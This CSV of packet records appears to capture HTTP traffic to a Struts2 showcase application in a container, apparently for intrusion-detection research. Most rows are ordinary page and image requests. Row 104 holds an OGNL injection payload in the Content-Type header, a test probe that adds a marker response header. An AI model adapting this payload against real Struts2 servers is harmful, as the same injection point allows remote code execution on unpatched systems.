,content_type,dest_ip,dest_port,highest_layer,length,query_page,src_ip,timestamp
64,image/png,10.0.2.2,55972,PNG,1694,,172.17.0.2,1521394922.967698
65,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_R.png,10.0.2.2,1521394922.970352
66,image/png,10.0.2.2,55970,PNG,1566,,172.17.0.2,1521394922.973401
67,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_G.png,10.0.2.2,1521394922.975219
68,image/png,10.0.2.2,55972,PNG,1728,,172.17.0.2,1521394922.97665
69,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_E.png,10.0.2.2,1521394922.978683
70,image/png,10.0.2.2,55966,PNG,1552,,172.17.0.2,1521394922.979161
71,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_S.png,10.0.2.2,1521394922.981173
72,image/png,10.0.2.2,55966,PNG,1675,,172.17.0.2,1521394922.986969
73,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_Z.png,10.0.2.2,1521394922.988962
74,image/png,10.0.2.2,55972,PNG,1645,,172.17.0.2,1521394922.99321
75,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_V.png,10.0.2.2,1521394922.995191
76,image/png,10.0.2.2,55966,PNG,1635,,172.17.0.2,1521394922.996684
77,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_H.png,10.0.2.2,1521394922.998694
78,image/png,10.0.2.2,55972,PNG,1604,,172.17.0.2,1521394923.002779
79,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_J.png,10.0.2.2,1521394923.005131
80,image/png,10.0.2.2,55972,PNG,1507,,172.17.0.2,1521394923.009776
81,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_U.png,10.0.2.2,1521394923.011643
82,image/png,10.0.2.2,55966,PNG,1592,,172.17.0.2,1521394923.016672
83,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_L.png,10.0.2.2,1521394923.018782
84,image/png,10.0.2.2,55952,PNG,1600,,172.17.0.2,1521394923.039334
85,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_W.png,10.0.2.2,1521394923.042146
86,image/png,10.0.2.2,55972,PNG,1659,,172.17.0.2,1521394923.043606
87,image/png,10.0.2.2,55952,PNG,1722,,172.17.0.2,1521394923.050232
88,image/png,10.0.2.2,55968,PNG,1756,,172.17.0.2,1521394923.052156
89,image/png,10.0.2.2,55970,PNG,1650,,172.17.0.2,1521394923.054184
90,text/html;charset=UTF-8,10.0.2.2,55959,DATA-TEXT-LINES,459,,172.17.0.2,1521394923.061624
91,image/png,10.0.2.2,55966,PNG,1534,,172.17.0.2,1521394923.069116
92,,172.17.0.2,8080,HTTP,859,/freemarker/customFreemarkerManagerDemo.action,10.0.2.2,1521394927.154014
93,text/html;charset=UTF-8,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394927.265234
94,,172.17.0.2,8080,HTTP,979,/viewSource.action?config=&className=com.opensymphony.xwork2.ActionSupport&page=/freemarker//freemarker/customFreemarkerManagerUsage.ftl,10.0.2.2,1521394928.43434
95,text/html;charset=ISO-8859-1,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394928.510017
96,,172.17.0.2,8080,HTTP,812,/showcase.jsp,10.0.2.2,1521394933.86599
97,,172.17.0.2,8080,HTTP,714,/struts/utils.js,10.0.2.2,1521394933.919997
98,text/javascript,10.0.2.2,55959,DATA-TEXT-LINES,59,,172.17.0.2,1521394933.921927
99,text/html;charset=ISO-8859-1,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394933.923712
100,,172.17.0.2,8080,HTTP,841,/freemarker/standardTags.action,10.0.2.2,1521394938.008579
101,text/html;charset=UTF-8,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394938.615525
102,,172.17.0.2,8080,HTTP,968,/viewSource.action?config=&className=org.apache.struts2.showcase.freemarker.StandardTagsAction&page=/freemarker//freemarker/standardTags.ftl,10.0.2.2,1521394942.042459
103,text/html;charset=ISO-8859-1,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394942.143351
104,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521394990.943891
105,text/html;charset=ISO-8859-1,172.17.0.1,44126,DATA-TEXT-LINES,471,,172.17.0.2,1521394990.951015
106,text/html;charset=ISO-8859-1,172.17.0.1,39926,DATA-TEXT-LINES,471,,172.17.0.2,1521394995.907189
